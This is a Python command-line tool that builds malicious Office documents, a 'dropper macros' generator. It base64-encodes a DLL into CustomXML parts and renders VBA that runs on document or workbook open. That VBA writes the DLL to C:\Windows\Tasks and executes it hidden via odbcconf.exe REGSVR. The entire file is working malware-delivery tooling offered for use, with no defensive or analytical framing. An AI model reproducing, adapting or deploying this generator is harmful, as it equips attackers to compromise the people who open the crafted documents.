import click
import string
import random
import base64
import jinja2

VBA_TEMPLATE = '''
{% if 'doc' in config['type'] %}
Sub AutoOpen()
    Run
End Sub

Sub Document_Open()
    Run
End Sub

{% elif 'xl' in config['type'] %}
Sub Auto_Open()
    Run
End Sub

Sub Workbook_Open()
    Run
End Sub
{% endif %}

Sub Run()
    Dim path As String
    Dim exe As String
    path = "{{config['path']}}"
    Drop(path)
    {%- if 'odbcconf' in config['exe'] %}
    Shell "C:\Windows\SysNative\odbcconf.exe /a {REGSVR " & path & "}", vbHide
    {% endif %}
End Sub

Sub Drop(ByVal Path As String)
    Dim decoded
    decoded = DecodeBase64(GetCustomPart("{{config['part']}}"))
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(Path, True)
    objFile.Write decoded
    objFile.Close
End Sub

Function GetCustomXMLPart(ByVal Name As String) As Object
    Dim part
    Dim parts
    
    On Error Resume Next
    {%- if 'doc' in config['type'] %}
    Set parts = ActiveDocument.CustomXMLParts
    {%- elif 'xl' in config['type'] %}
    Set parts = ThisWorkbook.CustomXMLParts
    {% endif %}
    
    For Each part In parts
        If part.SelectSingleNode("/*").BaseName = Name Then
            Set GetCustomXMLPart = part
            Exit Function
        End If
    Next
        
    Set GetCustomXMLPart = Nothing
End Function

Function GetCustomXMLPartTextSingle(ByVal Name As String) As String
    Dim part
    Dim out, m, n
    
    Set part = GetCustomXMLPart(Name)
    If part Is Nothing Then
        GetCustomXMLPartTextSingle = ""
    Else
        out = part.DocumentElement.Text
        n = Len(out) - 2 * Len(Name) - 5
        m = Len(Name) + 3
        If Mid(out, 1, 1) = "<" And Mid(out, Len(out), 1) = ">" And Mid(out, m - 1, 1) = ">" Then
            out = Mid(out, m, n)
        End If
        GetCustomXMLPartTextSingle = out
    End If
End Function

Function GetCustomPart(ByVal Name As String) As String
    On Error GoTo ProcError
    Dim tmp, j
    Dim part
    j = 0
    
    Set part = GetCustomXMLPart(Name & "_" & j)
    While Not part Is Nothing
        tmp = tmp & GetCustomXMLPartTextSingle(Name & "_" & j)
        j = j + 1
        Set part = GetCustomXMLPart(Name & "_" & j)
    Wend
    
    If Len(tmp) = 0 Then
        tmp = GetCustomXMLPartTextSingle(Name)
    End If
    
    GetCustomPart = tmp
    
ProcError:
End Function

Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML2 As Object
    Dim objNode As Object

    Set objXML2 = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML2.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = StrConv(objNode.nodeTypedValue, vbUnicode)
    Set objNode = Nothing
    Set objXML2 = Nothing
End Function
'''

def generate_customxml(payload):
    part_name = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    step = 512
    customxml = ''
    part_number = 1
    encoded = base64.b64encode(payload).decode()
    for i in range(0, len(encoded), step):
        customxml += '<{0}_{1}>{2}</{0}_{1}>\n'.format(part_name, part_number, encoded[i:i+step])
        part_number += 1

    return '<{0}_0>\n{1}</{0}_0>'.format(part_name, customxml), part_name

@click.command()
@click.option('--dll', '-d', type=click.Path(exists=True), help='Embed DLL payload')
@click.option('--doctype', '-t', default='doc', type=click.Choice(['doc', 'xl']))
@click.option('--drop-path', '-p', type=str, default="C:\\Windows\\Tasks\\eva.dll", help='Path on a target system')
@click.option('--execute', '-e', default='odbcconf', type=click.Choice(['odbcconf']))
@click.option('--xml-out', '-x', type=click.Path(exists=False), default=None, help='Output CustomXML part')
@click.option('--vba-out', '-v', type=click.Path(exists=False), default=None, help='Output VBA')
def cli(dll, doctype, drop_path, execute, xml_out, vba_out):
    """Generate dropper macros that drops payload from Custom XML part and executes DLL sideload."""

    with open(dll, 'rb') as f:
        customxml, part_name = generate_customxml(f.read())
    
    if xml_out is None:
        print(customxml)
    else:
        with open(xml_out, 'w') as f:
            f.write(customxml)
    
    config = {
        'part': part_name,
        'type': doctype,
        'exe': execute,
        'path': drop_path
    }

    template = jinja2.Environment(loader=jinja2.BaseLoader).from_string(VBA_TEMPLATE)
    vba = template.render(config=config)

    if vba_out is None:
        print(vba)
    else:
        with open(vba_out, 'w') as f:
            f.write(vba)

if __name__ == '__main__':
    cli()